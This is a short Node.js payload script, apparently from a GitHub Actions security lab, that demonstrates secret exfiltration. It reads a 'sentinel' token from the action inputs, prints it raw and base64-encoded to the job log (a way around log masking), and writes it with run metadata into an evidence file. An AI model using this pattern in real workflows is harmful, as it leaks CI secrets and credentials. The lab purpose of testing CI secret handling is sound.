const fs = require('fs');
const path = require('path');

// Lab payload v2 (exfil demo). Dummy sentinel secret ONLY.
const token = process.env['INPUT_SENTINEL-TOKEN'] || '';
const b64 = Buffer.from(token, 'utf8').toString('base64');
const ws = process.env.GITHUB_WORKSPACE || '.';

console.log('LAB-PAYLOAD-V2-EXECUTED');
console.log('LAB-SENTINEL-RAW=' + token);
console.log('LAB-SENTINEL-B64=' + b64);
console.log('LAB-SENTINEL-LEN=' + token.length);

fs.writeFileSync(
  path.join(ws, '.extracted', 'payload', 'evidence.txt'),
  [
    'payload_version=v2-exfil',
    'sentinel_raw=' + token,
    'sentinel_b64=' + b64,
    'sentinel_len=' + token.length,
    'run_id=' + process.env.GITHUB_RUN_ID,
    'workflow_ref=' + process.env.GITHUB_WORKFLOW_REF,
  ].join('\n') + '\n',
);

fs.writeFileSync(
  path.join(ws, '.lab-marker-v2.txt'),
  'LAB-MARKER-V2 ' + new Date().toISOString() + ' run=' + process.env.GITHUB_RUN_ID + '\n',
);